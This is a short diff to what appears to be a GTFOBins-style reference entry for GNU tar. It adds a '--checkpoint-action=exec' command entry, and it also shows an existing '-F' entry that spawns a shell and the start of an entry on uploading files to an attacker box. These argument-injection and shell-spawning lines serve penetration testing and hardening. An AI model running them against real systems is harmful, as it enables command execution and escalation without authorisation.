@@ -10,6 +10,10 @@ functions:
     - description: GNU tar specifc. The -F / --info-script= / --new-volume-script= arguments will run a command at volume rotation. Other flags used are to force frequent rotation.
       code: |
         tar cf /dev/null --record-size=512 -L1 -F'/bin/sh -c "sh <&2 1>&2"' /tmp/
+  command:
+    - description: During archive creation, `--checkpoint` and `--checkpoint-action` can execute arbitrary commands. Requires injecting two arguments and a positional argument.
+      code: |
+        tar '--checkpoint=1' '--checkpoint-action=exec="sh shell.sh"'
   file-upload:
     - description: This only works for GNU tar. Create tar archive and send it via SSH to a remote location. The attacker box must have the `rmt` utility installed (it should be present by default in Debian-like distributions).
       code: |
